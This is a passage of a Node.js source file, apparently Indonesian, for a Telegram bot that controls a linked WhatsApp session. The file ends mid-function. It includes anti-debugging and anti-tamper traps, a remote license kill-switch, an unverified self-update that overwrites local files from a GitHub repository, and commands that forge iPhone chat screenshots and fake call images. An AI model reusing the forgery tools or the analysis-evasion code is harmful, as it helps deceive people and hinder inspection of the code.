const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/bluzoficial/Bluzcogan/refs/heads/main/token.json/';

const thumbnailUrl = "https://files.catbox.moe/ep2s8m.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`⠀⠀
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
         hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
         hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
       hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
       hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
  `));
    activateSecureMode();
     hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const GH_OWNER = "nama github";
const GH_REPO = "repo auto update";
const GH_BRANCH = "main"; // ini gausa di apa apain

async function downloadRepo(dir = "", basePath = "/home/container") {
  const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

  const { data } = await axios.get(url, {
    headers: { "User-Agent": "Mozilla/5.0" }
  });

  for (const item of data) {
    const local = path.join(basePath, item.path);

    if ([
      "settings/config.js",
      "cmd.json",
      "database/adminuser.json"
    ].includes(item.path)) continue;

    if (item.type === "file") {
      const fileData = await axios.get(item.download_url, {
        responseType: "arraybuffer"
      });

      fs.mkdirSync(path.dirname(local), { recursive: true });
      fs.writeFileSync(local, Buffer.from(fileData.data));
    }

    if (item.type === "dir") {
      fs.mkdirSync(local, { recursive: true });
      await downloadRepo(item.path, basePath);
    }
  }
}

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const { CHANNEL_USERNAME } = require("./settings/config");

async function checkJoin(userId) {
  try {
    const member = await bot.telegram.getChatMember(
      CHANNEL_USERNAME,
      userId
    );

    return [
      "member",
      "administrator",
      "creator"
    ].includes(member.status);

  } catch {
    return false;
  }
}

const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();

  if (!text.startsWith("/")) return next();

  // ambil command utama
  let cmd = text.split(" ")[0].toLowerCase();

  // hapus @botusername
  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }

  const db = loadDB();
  const chatId = String(ctx.chat.id);

  // =========================
  // GLOBAL DISABLE COMMAND
  // =========================
  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(
      db.commands[cmd].reason ||
      "⛔ Command ini dimatikan."
    );
  }

  // =========================
  // BLOCK COMMAND CHAT
  // =========================
  const blocked =
    db.groupCmdBlock?.[chatId] || [];

  // normalize semua cmd
  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply(
      "⛔ Command ini diblock di chat ini."
    );
  }

  return next();
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'
const dbPath = "./Db/ControlCommand.json";

function loadDB() {
  if (!fs.existsSync(dbPath)) {
    return {
      commands: {},
      groupCmdBlock: {}
    };
  }

  return JSON.parse(fs.readFileSync(dbPath, "utf8"));
}

function saveDB(data) {
  fs.writeFileSync(
    dbPath,
    JSON.stringify(data, null, 2)
  );
}

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


» Information:
  Developer: @bluzstur
  Version: 1.0
  Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ Xhonix Elite⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "SUNLYNIX");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⬡═―—⊱ ⎧ Xhonix Elite⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⬡═―—⊱ ⎧ Xhonix Elite⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync(adminFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const saveAdmins = (admins) => {
    try {
        fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
    } catch (err) {
    }
};

const addAdmin = (userId) => {
    const admins = loadAdmins();
    admins[userId] = true;
    saveAdmins(admins);
    return true;
};

const removeAdmin = (userId) => {
    const admins = loadAdmins();
    delete admins[userId];
    saveAdmins(admins);
    return true;
};

const isAdmin = (userId) => {
    const admins = loadAdmins();
    return admins[userId] === true || userId == ownerID;
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
    }
    
    const userId = args[1];
    addAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai admin`);
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }
    
    const userId = args[1];
    if (userId == ownerID) {
        return ctx.reply("❌ ☇ Tidak dapat menghapus pemilik utama");
    }
    
    removeAdmin(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar admin`);
});


bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply(
      "🎵 Download TikTok\n\nContoh:\n/tiktok https://vt.tiktok.com/xxxx"
    );
  }

  try {
    const processing = await ctx.reply("⏳ Mengunduh video TikTok...");

    const params = new URLSearchParams({
      url: args,
      hd: "1",
    });

    const { data } = await axios.post(
      "https://tikwm.com/api/",
      params.toString(),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        timeout: 30000,
      }
    );

    if (!data || data.code !== 0 || !data.data?.play) {
      throw new Error("Video tidak ditemukan");
    }

    await ctx.telegram.deleteMessage(
      processing.chat.id,
      processing.message_id
    );

    await ctx.replyWithVideo(data.data.play, {
      caption: `🎵 ${data.data.title || "Video TikTok"}\n\n✅ Tanpa watermark`,
    });

    if (data.data.music) {
      await ctx.replyWithAudio(data.data.music, {
        title: "Audio Original",
      });
    }
  } catch (err) {
    console.error(err);
    await ctx.reply(`❌ ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

//MD MENU
bot.command("pullupdate", async (ctx) => {
  if (ctx.from.id.toString() !== ownerID.toString()) {
    return ctx.reply("❌ Khusus owner");
  }

  await ctx.reply("⏳ Auto Update Script Mohon Tunggu...");

  try {
    await downloadRepo("");

    await ctx.reply(`✅ Update Berhasil
📄 File: main.js
♻️ Restarting...

© NEXORA VERSE`);

    setTimeout(() => process.exit(0), 1500);

  } catch (e) {
    console.log(e);

    await ctx.reply(`❌ Gagal update
${e.message}`);
  }
});

bot.command("blockcmd", async (ctx) => {
  if (ctx.from.id.toString() !== ownerID.toString()) {
    return ctx.reply("❌ Khusus owner")
  }

  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /blockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[groupId])
      db.groupCmdBlock[groupId] = [];

    // sudah ada
    if (db.groupCmdBlock[groupId].includes(cmd)) {
      return ctx.reply("⚠️ Command sudah diblock.");
    }

    db.groupCmdBlock[groupId].push(cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil block command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});


// ===============================
// UNBLOCK CMD GROUP
// ===============================

bot.command("unblockcmd", async (ctx) => {
  if (ctx.from.id.toString() !== ownerID.toString()) {
    return ctx.reply("❌ Khusus owner")
  }

  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /unblockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock?.[groupId]) {
      return ctx.reply("⚠️ Tidak ada command yang diblock.");
    }

    db.groupCmdBlock[groupId] =
      db.groupCmdBlock[groupId].filter(c => c !== cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  if (ctx.from.id.toString() !== ownerID.toString()) {
    return ctx.reply("❌ Khusus owner")
  }

  try {
    const db = loadDB();
    const chatId = String(ctx.chat.id);

    const blocked =
      db.groupCmdBlock?.[chatId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK COMMAND\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
